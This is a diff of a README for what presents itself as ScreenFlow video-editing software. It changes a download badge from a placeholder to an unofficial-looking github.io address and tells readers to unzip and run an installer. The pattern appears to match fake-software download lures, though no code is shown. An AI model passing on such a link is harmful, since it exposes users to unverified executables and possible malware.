@@ -8,7 +8,7 @@ With **intuitive editing tools, transitions, titles, and direct export options**
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://screenflow-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer and follow on-screen instructions.  
